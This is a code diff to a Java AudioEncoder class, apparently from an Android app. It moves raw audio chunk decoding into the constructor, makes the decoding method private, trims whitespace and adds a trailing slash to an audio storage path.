@@ -33,6 +33,14 @@ public class AudioEncoder {
 	
 	public AudioEncoder(String f) {
 		rawFile = f;
+		
+		try {
+			rawPcm = decodeRawChunks();
+		} catch (IOException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+		}
 	}
 	
 	public int getBitrate() {
@@ -92,7 +100,7 @@ public class AudioEncoder {
 		    out.write(0x41);
 		    out.write(0x4D);
 		    out.write(0x52);
-		    out.write(0x0A);    
+		    out.write(0x0A);
 		
 		    byte[] buf = new byte[4096];
 		    int len;
@@ -139,7 +147,7 @@ public class AudioEncoder {
 		return wave.getBytes();
 	}
 	
-	public byte[] decodeRawChunks() throws IOException {
+	private byte[] decodeRawChunks() throws IOException {
 		int end_of_call = 0xF00DF00D;
 		int epoch, streamType, blockLen;
 		int discard_frame_size = 8;
@@ -295,7 +303,7 @@ public class AudioEncoder {
 	
 	static public boolean createAudioStorage() {
 		// Create storage directory
-		audioDirectory = getAudioDirectoryName();
+		audioDirectory = getAudioDirectoryName() + "/";
 		audioStorage = Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + audioDirectory;
 	
 		if (Path.createDirectory(audioStorage) == false) {
